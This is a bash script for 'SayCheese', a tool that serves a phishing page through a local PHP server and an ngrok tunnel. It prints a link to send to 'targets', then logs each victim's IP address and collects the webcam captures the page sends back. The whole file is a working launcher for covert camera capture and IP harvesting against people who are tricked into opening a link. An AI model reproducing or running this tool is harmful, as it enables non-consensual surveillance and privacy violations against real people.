#!/bin/env bash
# SayCheese v1.0
# coded by: github.com/thelinuxchoice/saycheese
# If you use any part from this code, giving me the credits. Read the Lincense!

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
printf "\e[1;92m              |___/ \e[0m                                 \n"
printf "\n \e[1;77m Original version 1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
printf "\n \e[1;77m Version 1.01 modified by someone who wanted to correct errors.\e[0m \n"
printf "                                                               \n"
printf "\e[1;33m                  _-''-.                         \e[0m \n"
printf "\e[1;33m               .-'      '-.                      \e[0m \n"
printf "\e[1;33m              |''--..      '-.                   \e[0m \n"
printf "\e[1;33m              |      ''--..   '-.                \e[0m \n"
printf "\e[1;33m              |.-. .-.     ''--..'.              \e[0m \n"
printf "\e[1;33m              |'./ -_'   .-.      |              \e[0m \n"
printf "\e[1;33m              |      .-. '.-'   .-'              \e[0m \n"
printf "\e[1;33m              '--..  '.'    .-  -.               \e[0m \n"
printf "\e[1;33m                   ''--..   '_'   :              \e[0m \n"
printf "\e[1;33m                         ''--..   |              \e[0m \n"
printf "\e[1;33m                               ''-'              \e[0m \n"
printf "                                                               \n"
printf "\n"
}


stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
exit 1
}


dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it with apt-get install php"; }
command -v jq > /dev/null 2>&1 || { echo >&2 "I require jq but it's not installed. Installing it with apt-get install jq"; apt-get install jq; }
}


catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt
}


checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
fi
sleep 0.5
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
done 
}


ngrok_link() {
echo ""
url=$(curl -s http://127.0.0.1:4040/api/tunnels | jq . | grep public | cut -d '"' -f 4 | grep 'https://')
echo "Send this link:  $url"
}


ngrok_server() {
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget -c https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip -o ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget -c https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip -o ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 -t ./> /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

ngrok_link
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
printf "\n"
printf "\e[1;92mPress any key to start the server...\e[0m\n"
read
ngrok_server
}


banner
dependencies
start1
echo "\e[0m"